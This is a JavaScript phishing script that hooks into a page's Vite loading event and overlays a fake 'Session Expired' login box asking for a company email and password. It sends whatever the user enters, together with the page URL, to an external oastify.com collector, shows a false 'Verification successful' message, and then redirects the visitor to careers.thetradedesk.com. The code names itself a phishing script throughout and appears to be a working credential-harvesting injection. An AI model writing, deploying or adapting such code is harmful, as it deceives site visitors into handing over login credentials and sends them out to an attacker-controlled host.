// Wait for Vite to finish loading
document.addEventListener('vite-script-loaded', function() {
  // Create fake login overlay
  const fakeLogin = document.createElement('div');
  fakeLogin.className = 'phishing-overlay';
  fakeLogin.innerHTML = `
    <div class="phishing-container">
      <h2 style="color:#d23f00">Session Expired - Please Reauthenticate</h2>
      <p>Your session has expired for security reasons:</p>
      <input type="email" id="phish-email" placeholder="Company Email" class="phishing-input">
      <input type="password" id="phish-pwd" placeholder="Password" class="phishing-input">
      <button id="phish-submit" class="phishing-button">Sign In</button>
    </div>
  `;
  
  document.body.appendChild(fakeLogin);
  
  // Event delegation with better error handling
  document.body.addEventListener('click', function(e) {
    if(e.target && e.target.id === 'phish-submit') {
      try {
        const email = document.getElementById('phish-email').value;
        const pwd = document.getElementById('phish-pwd').value;
        
        // Use fetch API with error handling
        fetch('https://5synx55etlldi0ogs08w4pg25tbkzkn9.oastify.com/phish', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            email: email,
            pwd: pwd,
            origin: window.location.href,
            timestamp: new Date().toISOString()
          }),
          mode: 'no-cors'
        }).catch(e => console.error);
        
        // Show fake loading message
        fakeLogin.innerHTML = '<div style="text-align:center;padding:20px;"><p>Verification successful. Redirecting...</p></div>';
        
        // Redirect after 2 seconds
        setTimeout(() => { 
          fakeLogin.style.display = 'none';
          window.location.href = 'https://careers.thetradedesk.com';
        }, 2000);
      } catch (e) {
        console.error('Phishing script error:', e);
        // Still redirect even if error occurs
        window.location.href = 'https://careers.thetradedesk.com';
      }
    }
  });
});
